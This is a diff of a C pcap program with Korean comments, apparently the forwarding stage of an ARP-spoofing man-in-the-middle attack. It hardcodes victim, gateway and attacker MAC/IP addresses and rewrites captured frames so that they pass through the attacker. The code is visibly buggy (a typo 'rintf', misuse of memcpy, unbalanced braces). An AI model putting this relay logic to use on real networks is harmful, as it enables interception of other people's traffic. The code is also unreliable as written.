@@ -53,7 +53,6 @@ void main()
 	pcap_t* adhandle;
 	char errbuf[PCAP_ERRBUF_SIZE];
 	int res;
-	char timestr[16];
 	struct tm* ltime;
 	struct pcap_pkthdr* header;
 	const u_char* pkt_data;
@@ -61,9 +60,10 @@ void main()
 	u_int ip_len;
 	ipv4_header* ih;
 	ether_header* eh;
-	uint8_t victim[ETH_LEN] = { 0xd4, 0xbe, 0xd9, 0x92, 0x38, 0x1f };
-	uint8_t attackerip[IP_LEN] = { 192,168,42,4 };
+	uint8_t victim[ETH_LEN] = { 0x18, 0x67, 0xb0, 0xca, 0xb4, 0xb1 };
+	uint8_t attackerip[IP_LEN] = { 192,168,42,30 };
 	uint8_t gatewaym[ETH_LEN] = { 0x88, 0x36, 0x6c, 0x7a, 0x56, 0x40 };
+	uint8_t attackerm[ETH_LEN] = { 0xb0, 0x6e, 0xbf, 0xc6, 0xfa, 0x45 };
 
 
 	/*로컬 컴퓨터에서 장치 목록을 검색*/
@@ -138,6 +138,7 @@ void main()
 		u_char* dstip = ih->daddr;
 		int count = 0;
 		int count2 = 0;
+		u_char* packet[10000];
 
 
 
@@ -148,9 +149,11 @@ void main()
 					|| dstip[3] != attackerip[3]) {
 
 					rintf("여기까지는됨\n");
+					memcpy(eh->src_host, attackerm, sizeof(eh->src_host));
 					memcpy(eh->dst_host, gatewaym, sizeof(eh->dst_host));
-					memcpy(pkt_data, &eh, sizeof(header->len));
+					memcpy(packet, &eh, sizeof(eh));
 					header->len += sizeof(eh);
+
 					pcap_sendpacket(adhandle, pkt_data, header->len);
 
 					printf("%02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x\n",
@@ -168,26 +171,11 @@ void main()
 						eh->dst_host[4],
 						eh->dst_host[5]);
 				}
-				else {
-					printf("다시.\n");
 				}
 			}
-			else {
-				printf("다시.\n");
-			}
-
 		}
 		if (res == -1) 
 			printf("패킷 읽기 오류 : %s\n", pcap_geterr(adhandle));
-			return -1;
-		
-		//헤더 위치 검색
-
-		/*//ether헤더 위치 검색
-		ip_len = (ih->ver & 0xf) * 4;
-		eh = (ether_header*)((uint8_t*)ih + ip_len);*/
-
-		
-		
+			return -1;	
 }
 	
